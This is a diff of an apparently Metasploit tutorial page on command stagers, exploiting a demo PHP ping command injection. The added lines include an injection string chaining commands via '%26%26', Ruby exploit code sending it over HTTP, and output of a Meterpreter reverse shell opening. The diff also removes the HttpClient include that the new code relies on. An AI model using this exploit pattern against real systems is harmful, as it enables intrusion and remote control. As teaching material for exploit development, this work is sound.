@@ -1,6 +1,6 @@
 Command stagers provide an easy way to write exploits against typical vulnerabilities such as [command execution](https://www.owasp.org/index.php/Command_Injection) or [code injection](https://www.owasp.org/index.php/Code_Injection). There are currently eight different flavors of command stagers, each uses some sort of system command to save your payload onto the target machine, and execute it.
 
-# The Vulnerability to Play with
+# The Vulnerability Test Case
 
 The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:
 
@@ -102,13 +102,12 @@ class MetasploitModule < Msf::Exploit::Remote
   Rank = NormalRanking
 
   include Msf::Exploit::CmdStager
-  include Msf::Exploit::Remote::HttpClient
 
   def initialize(info={})
     super(update_info(info,
-      'Name'            => "Ping Command Injection Vulnerability Demo",
+      'Name'            => "Command Injection Using CmdStager",
       'Description'     => %q{
-        This exploits a command injection in our ping.php demo script.
+        This exploits a command injection using the command stager.
       },
       'License'         => MSF_LICENSE,
       'Author'          => [ 'sinn3r' ],
@@ -116,7 +115,7 @@ class MetasploitModule < Msf::Exploit::Remote
       'Platform'        => 'linux',
       'Targets'         => [ [ 'Linux', {} ] ],
       'Payload'         => { 'BadChars' => "\x00" },
-      'CmdStagerFlavor' => [ 'echo' ]
+      'CmdStagerFlavor' => [ 'printf' ],
       'Privileged'      => false,
       'DisclosureDate'  => "Jun 10 2016",
       'DefaultTarget'   => 0))
@@ -134,9 +133,53 @@ class MetasploitModule < Msf::Exploit::Remote
 end
 ```
 
-As you can see, we have chosen the "echo" flavor as our command stager. We will explain more about
+As you can see, we have chosen the "printf" flavor as our command stager. We will explain more about
 this later, but basically what it does is it writes our payload to /tmp and execute it.
 
+Now let's modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:
+
+```
+127.0.0.1+%26%26+[Malicious commands]
+```
+
+We do that in execute_command using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some character filtering involved to get the exploit working correctly, which is expected:
+
+```ruby
+def filter_bad_chars(cmd)
+  cmd.gsub!(/chmod \+x/, 'chmod 777')
+  cmd.gsub!(/;/, ' %26%26 ')
+  cmd.gsub!(/ /, '+')
+end
+
+def execute_command(cmd, opts = {})
+  send_request_cgi({
+    'method'        => 'GET',
+    'uri'           => '/ping.php',
+    'encode_params' => false,
+    'vars_get'      => {
+      'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
+    }
+  })
+end
+
+def exploit
+  print_status("Exploiting...")
+  execute_cmdstager
+end
+```
+
+And let's run that, we should have a shell:
+
+
+```
+msf exploit(cmdstager_demo) > run
+
+[*] Started reverse TCP handler on 10.6.0.92:4444 
+[*] Exploiting...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] Sending stage (1495599 bytes) to 10.6.0.92
+[*] Meterpreter session 2 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
+```
 
 
 # Flavors
